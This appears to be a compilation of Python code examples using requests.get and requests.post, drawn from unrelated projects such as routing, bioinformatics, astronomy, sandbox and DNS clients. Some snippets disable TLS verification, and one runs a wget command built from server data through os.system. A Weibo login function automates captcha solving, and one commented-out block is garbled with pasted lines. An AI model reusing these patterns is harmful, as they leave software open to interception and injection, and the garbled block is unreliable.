        cutout_url += '&red='+image_name

        dest_file = filt + '_template.fits'

        cmd = 'wget -O %s "%s"' % (dest_file, cutout_url)

        os.system(cmd)

        print 'Template downloaded as ' + dest_file + '\n'

    except:
        print '\nPS1 template search failed!\n' 
**************************************
def address_to_coords(self, address):
        """Convert address to coordinates"""

        base_coords = self.BASE_COORDS[self.region]
        get_cord = self.COORD_SERVERS[self.region]
        url_options = {
            "q": address,
            "lang": "eng",
            "origin": "livemap",
            "lat": base_coords["lat"],
            "lon": base_coords["lon"]
        }

        response = requests.get(self.WAZE_URL + get_cord, params=url_options, headers=self.HEADERS)
        for response_json in response.json():
            if response_json.get('city'):
                lat = response_json['location']['lat']
                lon = response_json['location']['lon']
                bounds = response_json['bounds']  # sometimes the coords don't match up
                if bounds is not None:
                    bounds['top'], bounds['bottom'] = max(bounds['top'], bounds['bottom']), min(bounds['top'], bounds['bottom'])
                    bounds['left'], bounds['right'] = min(bounds['left'], bounds['right']), max(bounds['left'], bounds['right'])
                else:
                    bounds = {}
                return {"lat": lat, "lon": lon, "bounds": bounds}
        raise WRCError("Cannot get coords for %s" % address) 
**************************************
def get_route(self, npaths=1, time_delta=0):
        """Get route data from waze"""

        routing_server = self.ROUTING_SERVERS[self.region]

        url_options = {
            "from": "x:%s y:%s" % (self.start_coords["lon"], self.start_coords["lat"]),
            "to": "x:%s y:%s" % (self.end_coords["lon"], self.end_coords["lat"]),
            "at": time_delta,
            "returnJSON": "true",
            "returnGeometries": "true",
            "returnInstructions": "true",
            "timeout": 60000,
            "nPaths": npaths,
            "options": ','.join('%s:t' % route_option for route_option in self.route_options),
        }
        if self.vehicle_type:
            url_options["vehicleType"] = self.vehicle_type
        # Handle vignette system in Europe. Defaults to false (show all routes)
        if self.avoid_subscription_roads is False:
            url_options["subscription"] = "*"

        response = requests.get(self.WAZE_URL + routing_server, params=url_options, headers=self.HEADERS)
        response.encoding = 'utf-8'
        response_json = self._check_response(response)
        if response_json:
            if 'error' in response_json:
                raise WRCError(response_json.get("error"))
            else:
                if response_json.get("alternatives"):
                    return [alt['response'] for alt in response_json['alternatives']]
                if npaths > 1:
                    return [response_json['response']]
                return response_json['response']
        else:
            raise WRCError("empty response") 
**************************************
def _add_up_route(self, results, real_time=True, stop_at_bounds=False):
        """Calculate route time and distance."""

        start_bounds = self.start_coords['bounds']
        end_bounds = self.end_coords['bounds']

        def between(target, min, max):
            return target > min and target < max

        time = 0
        distance = 0
        for segment in results:
            if stop_at_bounds and segment.get('path'):
                x = segment['path']['x']
                y = segment['path']['y']
                if (
                    between(x, start_bounds.get('left', 0), start_bounds.get('right', 0)) or
                    between(x, end_bounds.get('left', 0), end_bounds.get('right', 0))
                ) and (
                    between(y, start_bounds.get('bottom', 0), start_bounds.get('top', 0)) or
                    between(y, end_bounds.get('bottom', 0), end_bounds.get('top', 0))
                ):
                    continue
            time += segment['crossTime' if real_time else 'crossTimeWithoutRealTime']
            distance += segment['length']
        route_time = time / 60.0
        route_distance = distance / 1000.0
        return route_time, route_distance 
**************************************
def convert_entrez_to_uniprot(self, entrez):
        """Convert Entrez Id to Uniprot Id"""
        server = "http://www.uniprot.org/uniprot/?query=%22GENEID+{0}%22&format=xml".format(entrez)
        r = requests.get(server, headers={"Content-Type": "text/xml"})
        if not r.ok:
            r.raise_for_status()
            sys.exit()
        response = r.text
        info = xmltodict.parse(response)
        try:
            data = info['uniprot']['entry']['accession'][0]
            return data
        except TypeError:
            data = info['uniprot']['entry'][0]['accession'][0]
            return data 
**************************************
def convert_accession_to_taxid(self, accessionid):
        """Convert Accession Id to Tax Id """
        # Submit request to NCBI eutils/Taxonomy Database
        server = "http://eutils.ncbi.nlm.nih.gov/entrez/eutils/efetch.fcgi?" + self.options + "&db=nuccore&id={0}&retmode=xml".format(
            accessionid)
        r = requests.get(server, headers={"Content-Type": "text/xml"})
        if not r.ok:
            r.raise_for_status()
            sys.exit()
        # Process Request
        response = r.text
        records = xmltodict.parse(response)
        try:
            for i in records['GBSet']['GBSeq']['GBSeq_feature-table']['GBFeature']['GBFeature_quals']['GBQualifier']:
                for key, value in i.items():
                    if value == 'db_xref':
                        taxid = i['GBQualifier_value']
                        taxid = taxid.split(':')[1]
                        return taxid
        except:
            for i in records['GBSet']['GBSeq']['GBSeq_feature-table']['GBFeature'][0]['GBFeature_quals']['GBQualifier']:
                for key, value in i.items():
                    if value == 'db_xref':
                        taxid = i['GBQualifier_value']
                        taxid = taxid.split(':')[1]
                        return taxid
        return 
**************************************
def resolve_reference(cls, design_ref):
        """Resolve a reference to a design document.

        Locate a schema handler based on the URI scheme of the data reference
        and use that handler to get the data referenced.

        :param design_ref: A URI-formatted reference to a data entity
        """
        try:
            design_uri = urllib.parse.urlparse(design_ref)

            handler = cls.scheme_handlers.get(design_uri.scheme, None)

            if handler is None:
                raise errors.InvalidDesignReference(
                    "Invalid reference scheme %s: no handler." %
                    design_uri.scheme)
            else:
                tries = 0
                while tries < config_mgr.conf.network.http_client_retries:
                    try:
                        # Have to do a little magic to call the classmethod as a pointer
                        return handler.__get__(None, cls)(design_uri)
                    except Exception as ex:
                        tries = tries + 1
                        if tries < config_mgr.conf.network.http_client_retries:
                            LOG.debug("Retrying reference after failure: %s" %
                                      str(ex))
                            time.sleep(5**tries)
        except ValueError:
            raise errors.InvalidDesignReference(
                "Cannot resolve design reference %s: unable to parse as valid URI."
                % design_ref) 
**************************************
def scrawl_kernel(arch):
    re_href = re.compile('href="?({arch}[^ <>"]*)"?'.format(arch=arch))
    url = "https://toolchains.bootlin.com/downloads/releases/toolchains/{arch}/test-system/".format(arch=arch)
    response = requests.get(url + "?C=M;O=D")
    text = response.text
    links = re_href.findall(text)
    links_dict = defaultdict(lambda: defaultdict(dict))
    for link in links:
        version = get_link_version(link)
        libc = get_link_libc(link)
        filetype = get_link_filetype(link)

        # TODO: make sure they have been compiled at the same time
        if filetype not in links_dict[version][libc]:
            if filetype is None:
                return None, None, None
            links_dict[version][libc][filetype] = url + link

    state = "bleeding-edge"
    if "stable" in links_dict:
        state = "stable"

    for libc in ["glibc", "uclibc", "musl"]:
        if libc in links_dict[state]:
            break
    else:
        libc = None

    target = links_dict[state][libc]

    dtb = target.get("dtb", None)
    rootfs = target.get("rootfs", None)
    kernel = target.get("kernel", None)

    return kernel, dtb, rootfs 
**************************************
def indexof_parse(url):
    re_href = re.compile('\[DIR\].*href="?([^ <>"]*)"?')
    response = requests.get(url)
    text = response.text
    links = re_href.findall(text)
    return links 
**************************************
def get(self, key, alt=None):
        if key == 'desc':
            return self.desc or alt
        else:
            return self.attributes.get(key, alt) 
**************************************
def str_attributes(self):
        res = ''
        for k in ['Level', 'School', 'Classes']:
            if self.get(k) is not None:
                res += k + ': ' + self.get(k, 'EMPTY') + '\n'
        res += '\n'
        for k in ['Casting Time', 'Duration', 'Concentration', 'Ritual',
                  'Components', 'Material']:
            if self.get(k) is not None:
                res += k + ': ' + self.get(k, 'EMPTY') + '\n'
        res += '\n'
        for k in ['Range', 'Damage', 'Damage Type', 'Save', 'Target']:
            if self.get(k) is not None:
                res += k + ': ' + self.get(k, 'EMPTY') + '\n'
        return res 
**************************************
def heartbeat(self):
        '''
        Description: Hearbeat value
        Input:       No input
        Output:      Two possible values:
                 (0, error_info): Error getting heartbeat value
                 (1, heartbeat_value): Heartbeat value
        '''
        url = 'https://%s/php/heartbeat.php' % self.atdserver

        try:
            r = requests.get(url, headers=self.sessionhdr, verify=False)
        except Exception as e:
            error_info = 'Error getting heartbeat:\n%s' % e
            return(0, error_info)

        if r.status_code == 200:
            server_info = json.loads(r.content)

            if server_info['success'] is True:
                return (1, server_info['results']['heartBeat'])

            else:
                error_info = 'Error getting heartbeat, check credentials or content type header'
                return (0, error_info)
        else:
            error_info = 'Error getting heartbeat, status code: %d' % r.status_code
            return (0, error_info) 
**************************************
def get_report(self, job_id):
        '''
        Description: Get the final result of the inspection of the sample submitted
        Input:       jobId, identification of the job
        Output:      Possible values:

                 (0, error_info): Unsucessful procedure
                 (2, 'Result is not ready')
                 (3, 'Report not found, Ex. file not supported')
                 (1, {}): The dic includes all the json report
        '''

        url = 'https://%s/php/showreport.php' % self.atdserver

        payload = {'jobId': job_id, 'iType': 'json'}

        custom_header = {
            'Accept': 'application/vnd.ve.v1.0+json',
            'VE-SDK-API': '%s' % self.b64(self.session, self.userId)
        }

        try:
            r = requests.get(url, params=payload, headers=custom_header, verify=False)
        except Exception as e:
            error_info = 'Can not get report of jobId: %d,\nReturned error: %s ' % (job_id, e)
            return (0, error_info)

        if r.status_code == 400:
            info = 'Inspection not yet finished'
            return(2, info)

        if r.content.split('\n')[0] == 'Result is not ready':
            info = 'Result is not ready'
            return (2, info)
        else:
            if 'report file not found' in r.content.lower():
                server_info = 'Report not found - Ex. file not supported'
                return (3, server_info)
            else:
                server_info = json.loads(r.content)
                return (1, server_info) 
**************************************
def b64(self, user, password):
        '''
        Description: Internal procedure to get the base64 values used for authentication
        Input:       user and password
        Output:      base64('user:pass'): The dic includes all the json report
        '''
        import base64
        auth_string = user + ':' + password
        return base64.b64encode(auth_string) 
**************************************
def fetch_json(self, url):
        response = requests.get(url)
        return response.json()

# This method will be used by the mock to replace requests.get 
**************************************
def test_fetch(self, mock_get):
        # Assert requests.get calls
        my_class = MyClass()
        # call to url-1
        json_data = my_class.fetch_json('http://url-1.com/test.json')
        self.assertEqual(json_data, {"key1": "value1"})
        # call to url-2
        json_data = my_class.fetch_json('http://url-2.com/test.json')
        self.assertEqual(json_data, {"key2": "value2"})
        # call to url-3 that we did not mock
        json_data = my_class.fetch_json('http://url-3.com/test.json')
        self.assertIsNone(json_data) 
**************************************
def wait(self):
        while self.status != "error" and self.status != "completed":
            time.sleep(1)
            reply = requests.get("%s/job/%d" % (self.url, self.data["id"]))
            if reply.status_code != 200:
                try:
                    message = reply.json()["message"]
                except ValueError:
                    message = reply.content
                raise RuntimeError("Server returned error code %d: %s" % (reply.status_code, message))
            self.data = reply.json()["job"]
        return self.status 
**************************************
def list_jobs(self):
        reply = requests.get("%s/job" % self.url)
        if reply.status_code == 200:
            return [Job(self.url, job) for job in reply.json()["jobs"]]
        else:
            try:
                message = reply.json()["message"]
            except ValueError:
                message = reply.content
            raise RuntimeError("Server returned error code %d: %s" % (reply.status_code, message))

################# Command line interface ########################### 
**************************************
def parse_nodes_json_v1(data, *kwargs):
    out = []
    for k, n in data['nodes'].items():
        model = n.get("nodeinfo", {}).get("hardware", {}).get("model", None)
        if model is None:
            continue
        out.append({"model": model})

    return out 
**************************************
def parse_nodes_json_v2(data, *kwargs):
    out = []
    for n in data['nodes']:
        if type(n) is str:
            continue
        model = n.get("nodeinfo", {}).get("hardware", {}).get("model", None)
        if model is None:
            continue
        out.append({"model": model})

    return out 
**************************************
def verify_credentials(self):
        """
        Requests a token, salt and key from Nord api
        Sends a final hash of (salt+password)+key and token to Nord api
        Verifies responses and updates GUI
        """
        if self.user_input.text() and self.password_input.text():
            self.statusbar.showMessage('Login Success', 2000)
            self.username = self.user_input.text()
            self.password = self.password_input.text()
            self.repaint()
            time.sleep(0.5)
            self.hide()
            self.main_ui()
        else:
            self.statusbar.showMessage('Username or password field cannot be empty, 2000')
        # try:
        #     resp = requests.get('https://apself.statusbar.showMessage('Login Success', 2000)
    #                         self.username = self.user_input.text()
    #                         self.password = self.password_input.text()
    #                         self.repaint()
    #                         time.sleep(0.5)
    #                         self.hide()
    #                         self.main_ui()i.nordvpn.com/token/token/' + self.user_input.text(), timeout=5)
        #
        #     if resp.status_code == requests.codes.ok:
        #         token_json = json.loads(resp.text)
        #         token = token_json['token']
        #         salt = token_json['salt']
        #         key = token_json['key']
        #
        #         password_hash = hashlib.sha512(salt.encode() + self.password_input.text().encode())
        #         final_hash = hashlib.sha512(password_hash.hexdigest().encode() + key.encode())
        #
        #         try:
        #             resp = requests.get('https://api.nordvpn.com/token/verify/' + token + '/' + final_hash.hexdigest(), timeout=5)
        #             if resp.status_code == requests.codes.ok:
        #                 self.statusbar.showMessage('Login Success', 2000)
        #                 self.username = self.user_input.text()
        #                 self.password = self.password_input.text()
        #                 self.repaint()
        #                 time.sleep(0.5)
        #                 self.hide()
        #                 self.main_ui()
        #             else:
        #                 self.statusbar.showMessage('Invalid Credentials', 2000)
        #                 self.user_input.clear()
        #                 self.password_input.clear()
        #                 self.user_input.setFocus()
        #         except Exception as ex:
        #             self.statusbar.showMessage('Invalid Credentials', 2000)
        #             self.user_input.clear()
        #             self.password_input.clear()
        #             self.user_input.setFocus()
        #     else:
        #         self.statusbar.showMessage("API Error: could not fetch token", 2000)
        # except Exception as ex:
        #     self.statusbar.showMessage("API Error: could not fetch token", 2000)
        #     self.get_api_data() 
**************************************
def _get(self, url, extra_params=None, verbose=False, first_request_time=None, retry_counter=0, ignore_fail=False):
        if verbose and not first_request_time:
            print("Import on url %s " % url)

        if not first_request_time:
            first_request_time = datetime.now()

        elapsed = datetime.now() - first_request_time
        if elapsed > timedelta(seconds=self.retry_timeout):
            raise navitia_client.exceptions.Timeout()

        if retry_counter > 0:
            # 0.5 * (1.5 ^ i) is an increased sleep time of 1.5x per iteration,
            # starting at 0.5s when retry_counter=0. The first retry will occur
            # at 1, so subtract that first.
            delay_seconds = 0.5 * 1.5 ** (retry_counter - 1)
            time.sleep(delay_seconds)

        full_url = os.path.join(self.core_url, url)

        try:
            response = requests.get(
                url=full_url, auth=(self.user, self.password), params=(extra_params or {}))
            self.requested_urls.append(response.url)

        except requests.exceptions.Timeout:
            if not ignore_fail:
                raise navitia_client.exceptions.Timeout()
            else:
                return False
        except Exception as e:
            if not ignore_fail:
                raise navitia_client.exceptions.TransportError(e)
            else:
                return False

        # Warn if not 200
        if response.status_code != 200:
            print("WARNING: response status_code is %s" % response.status_code)

        if response.status_code in _RETRIABLE_STATUSES:
            # Retry request.
            print("WARNING: retry number %d" % retry_counter)
            return self._get(url=url, extra_params=extra_params, first_request_time=first_request_time, retry_counter=retry_counter + 1, verbose=verbose, ignore_fail=ignore_fail)

        return response 
**************************************
def init_inventory_well(well, headers=None, org_name=None,container_json=None):
    """Initialize well (set volume etc) for Transcriptic"""
    
    initialize_config()
        
    headers = headers if headers else TSC_HEADERS
    org_name = org_name if org_name else ORG_NAME    
    
    def _container_url(container_id):
        return 'https://secure.transcriptic.com/{}/samples/{}.json'.format(org_name, container_id)

    #only initialize containers that have already been made
    if not well.container.id:
        well.volume = ul(0)
        return

    if container_json:
        container = container_json
    else:
        response = requests.get(_container_url(well.container.id), headers=headers)
        response.raise_for_status()
    
        container = response.json()

    well_data = list(filter(lambda w: w['well_idx'] == well.index,container['aliquots']))
    
    #correct the cover status on the container
    
    #they don't return info on empty wells
    if not well_data:
        well.volume = ul(0)
        return
    
    well_data = well_data[0]
    well.name = "{}".format(well_data['name']) if well_data['name'] is not None else container["label"]
    well.properties = well_data['properties']
    if well_data.get('resource'):
        well.properties['Resource'] = well_data['resource']['name']
    well.volume = Unit(well_data['volume_ul'], 'microliter')

    if 'ERROR' in well.properties:
        raise ValueError("Well {} has ERROR property: {}".format(well, well.properties["ERROR"]))
    #if well.volume < Unit(20, "microliter"):
    #    logging.warn("Low volume for well {} : {}".format(well.name, well.volume))

    return True 
**************************************
def getcookies(user, passwd):
    # 获取验证码
    sign = random.random()
    url = "https://captcha.weibo.com/api/pattern/get?ver=daf139fb2696a4540b298756bd06266a&source=ssologin&usrname=" + user + "&line=160&side=100&radius=30&_rnd=" + str(
        sign) + "&callback=pl_cb"
    r = requests.get(url)
    imgdata = json.loads(r.text.replace("pl_cb(", '').replace(")", ''))['path_enc']
    id = json.loads(r.text.replace("pl_cb(", '').replace(")", ''))['id']
    recombinePattern(imgdata)
    data_enc = pathdataEncode(path_generate(patterntohash()))
    path_enc = pathEncode(patterntohash(), id)

    url2 = "https://captcha.weibo.com/api/pattern/verify?ver=daf139fb2696a4540b298756bd06266a&id=" + id + "&usrname=" + user + "&source=ssologin&path_enc=" + path_enc + "&data_enc=" + data_enc + "&callback=pl_cb"
    url3 = 'https://passport.weibo.cn/sso/login'
    # 必要的等待时间
    time.sleep(1)
    # 验证验证码
    session = requests.Session()
    r2 = session.get(url2)
    # print r2.headers
    print json.loads(r2.text.replace("pl_cb(", '').replace(")", ''))['msg']
    # print id

    formdata = {'username': user,
                'password': passwd,
                'savestate': '1',
                'ec': '0',
                'entry': 'mweibo',
                'mainpageflag': '1',
                'vid': id,
                'wentry': '',
                'loginfrom': '',
                'client_id': '',
                'code:qq': '',
                'r': '',
                'pagerefer': '',
                'hff': '',
                'hfp': ''}

    # print formdata['vid']
    # 登录
    r3 = session.post(url3, data=formdata, headers=headers3)
    cookies_url = r3.headers['Set-Cookie']
    print json.loads(r3.content)['msg']
    return {k.split('=')[0]: k.split('=')[1] for k in cookies_url.split(';')}

    # r4 = requests.get('https://m.weibo.cn/')
    # print r4.headers['Set-Cookie'] 
**************************************
def sync_dns_from_my_ip(self, dns_type='A'):
        """
        Sync dns from my public ip address.
        It will not do update if ip address in dns record is already same as
        current public ip address.
        :param dns_type:
        :return:
        """
        ip_address = ''
        for finder in self.public_ip_finder:
            try:
                result = requests.get(finder)
            except requests.RequestException:
                continue
            if result.status_code == 200:
                try:
                    socket.inet_aton(result.text)
                    ip_address = result.text
                    break
                except socket.error:
                    try:
                        socket.inet_aton(result.json().get('ip'))
                        ip_address = result.json()['ip']
                        break
                    except socket.error:
                        continue

        if ip_address == '':
            print('None of public ip finder is working. Please try later')
            sys.exit(1)

        try:
            record = self.get_record(dns_type, self.domain) \
                if len(self.domain.split('.')) == 3 \
                else self.get_record(dns_type, self.domain)
        except RecordNotFound:
            self.create_record(dns_type, self.domain, ip_address, proxied=self.proxied)
            print('Successfully created new record with IP address {new_ip}'
                  .format(new_ip=ip_address))
        else:
            if record['content'] != ip_address:
                self.update_record(dns_type, self.domain, ip_address, proxied=record['proxied'])
                print('Successfully updated IP address from {old_ip} to {new_ip}'
                      .format(old_ip=record['content'], new_ip=ip_address))
            else:
                print('IP address on CloudFlare is same as your current address') 
**************************************
def FlightInfo(ident, username, apiKey, verbose=0, results=10):
	try:
		fxmlUrl = "https://flightxml.flightaware.com/json/FlightXML3/"
		ident = ident.strip()
		payload = {'ident':ident, 'howMany':results}
		response = requests.get(fxmlUrl + "FlightInfoStatus", params=payload, auth=(username, apiKey))
		output = dict()
		if response.status_code == 402:
			print(response.text)
			return False
		if response.status_code == 200:
			decodedResponse = response.json()
			print(decodedResponse)
			if 'FlightInfoStatusResult' not in decodedResponse:
				return False
			for flight in decodedResponse['FlightInfoStatusResult']['flights']:
				if 'status' not in flight:
					continue
				if flight['status'].startswith('On') or flight['status'].startswith('En') or flight['status'].startswith('In'):
					output = {
						"orig_name":flight['origin']['airport_name'],
						"orig_city":flight['origin']['city'],
						"orig_alt":flight['origin']['alternate_ident'],
						"orig_code":flight['origin']['code'],
						"dest_name":flight['destination']['airport_name'],
						"dest_city":flight['destination']['city'],
						"dest_alt":flight['destination']['alternate_ident'],
						"dest_code":flight['destination']['code']
					}
					break
			if verbose:
				return decodedResponse
			else:
				return output
		else:
			print("FA API status code: {}".format(response.status_code))
			print(response.text)
			return False
	except Exception:
		print("exception in fa_api.FlightInfo():")
		traceback.print_exc()
		return False 
**************************************
def PS1catalog(ra,dec,magmin,magmax):

    queryurl = 'https://archive.stsci.edu/panstarrs/search.php?'
    queryurl += 'RA='+str(ra)
    queryurl += '&DEC='+str(dec)
    queryurl += '&SR=0.083&selectedColumnsCsv=ndetections,raMean,decMean,'
    queryurl += 'gMeanPSFMag,rMeanPSFMag,iMeanPSFMag,zMeanPSFMag,yMeanPSFMag,iMeanKronMag'
    queryurl += '&ordercolumn1=ndetections&descending1=on&max_records=200'

    print('\nQuerying PS1 for reference stars via MAST...\n')

    query = requests.get(queryurl)

    results = query.text

    entries = results.split('DATA')[2][11:][:-19].split('</TD>\n</TR>\n<TR>\n<TD>')

    data = []

    for i in entries:
        data.append(np.array(i.split('</TD><TD>')).T)

    if len(data) > 1:

        data = np.array(data).astype(float)

        # Get rid of n_det column
        data = data[:,1:][data[:,0]>3]

        # Get rid of non-detections:
        data = data[data[:,2]>-999]
        data = data[data[:,3]>-999]
        data = data[data[:,4]>-999]
        data = data[data[:,5]>-999]
        data = data[data[:,6]>-999]

        # Get rid of very faint stars
        data = data[data[:,2]<magmin]
        data = data[data[:,3]<magmin]
        data = data[data[:,4]<magmin]
        data = data[data[:,5]<magmin]
        data = data[data[:,6]<magmin]

        # Get rid of stars likely to saturate
        data = data[data[:,2]>magmax]
        data = data[data[:,3]>magmax]
        data = data[data[:,4]>magmax]
        data = data[data[:,5]>magmax]
        data = data[data[:,6]>magmax]


        # Star-galaxy separation
        data = data[:,:-1][data[:,4]-data[:,-1]<0.05]

        np.savetxt('PS1_seq.txt',data,fmt='%.8f\t%.8f\t%.2f\t%.2f\t%.2f\t%.2f\t%.2f',header='Ra\tDec\tg\tr\ti\tz\ty\n',comments='')

        print('Success! Sequence star file created: PS1_seq.txt')

    else:
        sys.exit('Field not in PS1! Exiting') 
**************************************
def PS1cutouts(ra,dec,filt):

    print('\nSearching for PS1 images of field...\n')

    ps1_url = 'http://ps1images.stsci.edu/cgi-bin/ps1filenames.py?'

    ps1_url += '&ra='+str(ra)
    ps1_url += '&dec='+str(dec)
    ps1_url += '&filters='+filt

    ps1_im = requests.get(ps1_url)

    try:
        image_name = ps1_im.text.split()[16]

        print('Image found: ' + image_name + '\n')

        cutout_url = 'http://ps1images.stsci.edu/cgi-bin/fitscut.cgi?&filetypes=stack&size=2500'

        cutout_url += '&ra='+str(ra)
        cutout_url += '&dec='+str(dec)
        cutout_url += '&filters='+filt
        cutout_url += '&format=fits'
        cutout_url += '&red='+image_name

        dest_file = filt + '_template.fits'

        cmd = 'wget -O %s "%s"' % (dest_file, cutout_url)

        os.system(cmd)

        print('Template downloaded as ' + dest_file + '\n')

    except:
        print('\nPS1 template search failed!\n')


##################################




# Try to match header keyword to a known filter automatically: 
**************************************
def PS1catalog(ra,dec,magmin,magmax):

    queryurl = 'https://archive.stsci.edu/panstarrs/search.php?'
    queryurl += 'RA='+str(ra)
    queryurl += '&DEC='+str(dec)
    queryurl += '&SR=0.083&selectedColumnsCsv=ndetections,raMean,decMean,'
    queryurl += 'gMeanPSFMag,rMeanPSFMag,iMeanPSFMag,zMeanPSFMag,yMeanPSFMag,iMeanKronMag'
    queryurl += '&ordercolumn1=ndetections&descending1=on&max_records=200'

    print '\nQuerying PS1 for reference stars via MAST...\n'

    query = requests.get(queryurl)

    results = query.text

    entries = results.split('DATA')[2][11:][:-19].split('</TD>\n</TR>\n<TR>\n<TD>')

    data = []

    for i in entries:
        data.append(np.array(i.split('</TD><TD>')).T)

    if len(data) > 1:

        data = np.array(data).astype(float)

        # Get rid of n_det column
        data = data[:,1:][data[:,0]>3]

        # Get rid of non-detections:
        data = data[data[:,2]>-999]
        data = data[data[:,3]>-999]
        data = data[data[:,4]>-999]
        data = data[data[:,5]>-999]
        data = data[data[:,6]>-999]

        # Get rid of very faint stars
        data = data[data[:,2]<magmin]
        data = data[data[:,3]<magmin]
        data = data[data[:,4]<magmin]
        data = data[data[:,5]<magmin]
        data = data[data[:,6]<magmin]

        # Get rid of stars likely to saturate
        data = data[data[:,2]>magmax]
        data = data[data[:,3]>magmax]
        data = data[data[:,4]>magmax]
        data = data[data[:,5]>magmax]
        data = data[data[:,6]>magmax]


        # Star-galaxy separation
        data = data[:,:-1][data[:,4]-data[:,-1]<0.05]

        np.savetxt('PS1_seq.txt',data,fmt='%.8f\t%.8f\t%.2f\t%.2f\t%.2f\t%.2f\t%.2f',header='Ra\tDec\tg\tr\ti\tz\ty\n',comments='')

        print 'Success! Sequence star file created: PS1_seq.txt'

    else:
        sys.exit('Field not in PS1! Exiting') 
**************************************
def connect(self, user, password):
        '''
        Description: Connection method, stablish a connection to the ATD server and populates all
                 self variables of the constructor
        Input:       User and password
        Output:      Two possible values:
                 (0, error_info): Unsucessful connection, error_info contain the cause of the error
                 (1, 'Connection sucessful): Sucessful connection
        '''

        #

        authheader = {
            'Accept': 'application/vnd.ve.v1.0+json',
            'Content-Type': 'application/json',
            'VE-API-Version': self.apiver,
            'VE-SDK-API': '%s' % self.b64(user, password)
        }

        url = 'https://%s/php/session.php' % self.atdserver

        try:
            r = requests.get(url, headers=authheader, verify=False)
        except Exception as e:
            error_info = 'Error connecting to ATD:\n %s' % e
            return (0, error_info)

        if r.status_code == 200:
            server_info = json.loads(r.content)
            if server_info['success'] is True:
                self.session = server_info['results']['session']
                self.userId = server_info['results']['userId']
                self.matdver = server_info['results']['matdVersion']
                self.sessionhdr = {
                    'Accept': 'application/vnd.ve.v1.0+json',
                    'Content-Type': 'application/json',
                    'VE-API-Version': self.apiver,
                    'VE-SDK-API': '%s' % self.b64(self.session, self.userId)
                }
            else:
                error_info = 'Connection unsucessful'
                return (0, error_info)
        else:
            if r.status_code == 401:
                error_info = 'Error conecting to ATD, Username / Password combination not accepted.'
                return(0, error_info)
            else:
                error_info = 'Error conecting to ATD, Status Code: %d' % r.status_code
                return(0, error_info)

        return(1, 'Connection sucessful') 

Python requests.post() Examples

**************************************
def getTicket():
    # put the ip address or dns of your apic-em controller in this url
    url = "https://" + controller + "/api/v1/ticket"

    #the username and password to access the APIC-EM Controller
    payload = {"username":"usernae","password":"password"}

    #Content type must be included in the header
    header = {"content-type": "application/json"}

    #Performs a POST on the specified url to get the service ticket
    response= requests.post(url,data=json.dumps(payload), headers=header, verify=False)

    #convert response to json format
    r_json=response.json()

    #parse the json to get the service ticket
    ticket = r_json["response"]["serviceTicket"]

    return ticket 
**************************************
def bindiff_export(self, sample, is_64_bit = True, timeout = None):
        """
        Load a sample into IDA Pro, perform autoanalysis and export a BinDiff database.
        :param sample: The sample's path
        :param is_64_bit: If the sample needs to be analyzed by the 64 bit version of IDA
        :param timeout: Timeout for the analysis in seconds
        :return: The file name of the exported bindiff database. The file needs
        to be deleted by the caller. Returns None on error.
        """

        data_to_send = {
            "timeout": timeout,
            "is_64_bit": is_64_bit}
        url = "%s/binexport" % next(self._urls)
        log.debug("curl -XPOST --data '%s' '%s'", json.dumps(data_to_send), url)
        response = requests.post(url, data = data_to_send, files = {os.path.basename(sample): open(sample, "rb")})
        if response.status_code == 200:
            handle, output = tempfile.mkstemp(suffix = ".BinExport")
            with os.fdopen(handle, "wb") as f:
                map(f.write, response.iter_content(1024))
            return output
        else:
            log.error("Bindiff server responded with status code %d: %s", response.status_code, response.content)
            return None 
**************************************
def answer_ponies(query_id, results, timed_out):
    result = requests.post(
        "https://api.telegram.org/bot{}/answerInlineQuery".format(settings.TELEGRAM_TOKEN),
        headers={"Content-Type": "application/json"},
        json={
            'inline_query_id': query_id,
            'cache_time': settings.CACHE_TIME if timed_out == 0 else settings.PARTIAL_RESULT_CACHE_TIME,
            'is_personal': False,
            'results': [
                {
                    'type': 'mpeg4_gif',
                    'id': url,
                    'mpeg4_url': url,
                    'thumb_url': thumb,
                    'mpeg4_width': dimensions[0],
                    'mpeg4_height': dimensions[1],
                } for url, thumb, id_number, dimensions in results
            ]
        })
    print(result.content)
    result.raise_for_status() 
**************************************
def processfile(inputfile, serverurl):
    headers = {'content-type': 'application/json'}
    try:
        with open(inputfile) as json_file:

            file_data = json_file.read()
            file_data = file_data.replace("\n", "")

            print(json.dumps(file_data, sort_keys=True, indent=4, separators=(',', ': ')))
            try:
                r = requests.post(serverurl, data=file_data, headers=headers, timeout=5)
            except Exception as err:

                print("COMMUNICATION ERROR : " + format(err))
                sys.exit(2)
    except Exception as err:
        print("File ERROR : " + format(err))

        return False

    print (inputfile + " sent to " + serverurl + ". Status code: " + str(r.status_code) + ".")

    return True 
**************************************
def sendNotification(url, msg):
    """Send a notification using a Slack webhook URL. See https://api.slack.com/incoming-webhooks

    Arguments:
        url (string): Slack incoming webhook URL for sending the message.
        msg (string): The message to be sent (can use markdown for formatting)
    """
    try:
        res = requests.post(url, data=json.dumps(
            {"text": msg, "mrkdwn": True}))
        if res.status_code != 200:
            print(f'Falied to send notification "{msg}" to "{url}"')
            print('Response', res.content)
            return False
    except Exception as e:
        print(f'Falied to send notification "{msg}" to "{url}"')
        print(e)
        return False
    return True 
**************************************
def fj_login(name=USERNAME, password=PASSWORD, email_mode=False, _print=False):
    ''' ([str, str, bool, bool]) -> dict
    name: your username. If email_mode == True, your email address
    password: your password
    email_mode: whether name is your email or username
    _print: debug

    returns authentication information'''
    
    if email_mode:
        url = 'https://account.freejamgames.com/api/authenticate/email/web'
        body_json = {'EmailAddress':name, 'Password':password}
        response = requests.post(url, json=body_json)
    else:
        url = 'https://account.freejamgames.com/api/authenticate/displayname/web'
        body_json = {'DisplayName':name, 'Password':password}
        response = requests.post(url, json=body_json)
    if response.status_code != 200:
        if _print:
            print('FJ Auth returned error', response.status_code)
    return response.json() 
**************************************
def pickle_export(self, sample, is_64_bit = True, timeout = None):
        """
        Load a sample into IDA Pro, perform autoanalysis and export a pickle file. 
        :param sample: The sample's path
        :param is_64_bit: If the sample needs to be analyzed by the 64 bit version of IDA
        :param timeout: Timeout for the analysis in seconds
        :return: The file name of the exported pickle database. The file needs
        to be deleted by the caller. Returns None on error.
        """

        data_to_send = {
            "timeout": timeout,
            "is_64_bit": is_64_bit}
        url = "%s/pickle" % next(self._urls)
        log.debug("curl -XPOST --data '%s' '%s'", json.dumps(data_to_send), url)
        response = requests.post(url, data = data_to_send, files = {os.path.basename(sample): open(sample, "rb")})
        if response.status_code == 200:
            handle, output = tempfile.mkstemp(suffix = ".pickle")
            with os.fdopen(handle, "wb") as f:
                map(f.write, response.iter_content(1024))
            return output
        else:
            log.error("Bindiff server responded with status code %d: %s", response.status_code, response.content)
